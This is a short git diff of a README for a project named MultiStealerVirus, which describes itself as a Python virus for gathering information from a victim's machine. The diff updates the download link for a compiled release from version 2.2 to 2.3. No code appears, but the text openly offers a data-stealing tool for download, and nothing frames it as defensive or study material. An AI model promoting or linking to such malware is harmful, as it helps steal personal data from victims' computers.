@@ -3,7 +3,7 @@ Python virus for getting various info about victims machine
 
 ## Usage
 
-1. You can download compiled version [here](https://github.com/Josakko/MultiStealerVirus/releases/tag/v2.2).
+1. You can download compiled version [here](https://github.com/Josakko/MultiStealerVirus/releases/tag/v2.3).
 
 <p align="center">
   <img alt="issue" src="https://github.com/Josakko/MultiStealerVirus/blob/main/img/img1.png?raw=true" width="600px">
